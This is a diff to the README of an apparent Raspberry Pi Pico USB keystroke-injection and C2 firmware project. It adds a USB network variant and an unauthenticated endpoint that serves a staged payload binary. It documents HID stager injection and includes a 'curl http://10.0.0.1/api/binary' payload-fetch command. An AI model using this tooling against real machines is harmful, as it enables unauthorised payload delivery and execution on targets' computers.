@@ -106,6 +106,11 @@ scripts/
   build.py             # local artifact builder
   build_pipeline.py    # AST bundler, mpy-cross helpers, config overrides
   release.py           # frozen-firmware release packager
+c_modules/
+  usb_ncm/
+    usb_ncm.c              # TinyUSB NCM callbacks + lwIP netif + Python bindings
+    usb_ncm_descriptors.c  # composite USB descriptor (HID + MSC + CDC-NCM, IAD)
+    micropython.cmake      # CMake wiring for MicroPython USER_C_MODULES build
 ```
 
 ---
@@ -128,6 +133,7 @@ scripts/
 | GET/POST | `/api/usb-agent` | Required | USB injector state + activation |
 | POST | `/api/inject_binary` | Required | Inject stager over HID (non-blocking) |
 | POST | `/api/upload_binary` | Required | Upload binary → `payload.exe`/`payload.bin` |
+| GET | `/api/binary` | **None** | Serve staged payload binary (NCM stager — `curl http://10.0.0.1/api/binary`) |
 | GET | `/api/execution/stream` | Required | SSE execution pipeline events |
 
 ---
@@ -203,7 +209,16 @@ uv run python -c "from scripts.asset_pipeline import sync_web_assets; sync_web_a
 ```
 
 **Build flags** (generate a configured source tree without modifying tracked files):
-`--ap-ssid`, `--ap-password`, `--portal-auth-enabled`, `--portal-username`, `--portal-password`, `--cors-allowed-origin`, `--cors-allow-credentials`
+`--ap-ssid`, `--ap-password`, `--portal-auth-enabled`, `--portal-username`, `--portal-password`, `--cors-allowed-origin`, `--cors-allow-credentials`, `--usb-ncm`
+
+**USB NCM firmware variant:**
+- `--usb-ncm` produces a second UF2 (`pico-bit-RPI_PICO2_W-ncm-vX.Y.Z.uf2`) — triple composite HID + MSC + CDC-NCM.
+- Firmware exposes `usb_ncm` C module and sets `USB_NCM_ENABLED=True` in `device_config.py`.
+- At boot, `usb_ncm.init('10.0.0.1', '255.255.255.0', '10.0.0.1')` registers a second lwIP netif; DHCP assigns `10.0.0.100–200` to the target host's USB interface.
+- The asyncio server binds `0.0.0.0:80` so the C2 portal is reachable at both `192.168.4.1` (Wi-Fi AP) and `10.0.0.1` (USB NCM) without any server changes.
+- `GET /api/binary` (unauthenticated) streams the staged binary for curl-based delivery on headless servers.
+- Standard builds are unaffected — `initialize_ncm()` returns `False` immediately when `USB_NCM_ENABLED=False` and the `usb_ncm` C module is absent.
+- `USBD_EP_BUILTIN_MAX=5` is set in the NCM build header to fence EP3/EP4 away from `machine.USBDevice`'s runtime allocator; HID then uses EP5+.
 
 **UI development:**
 ```bash
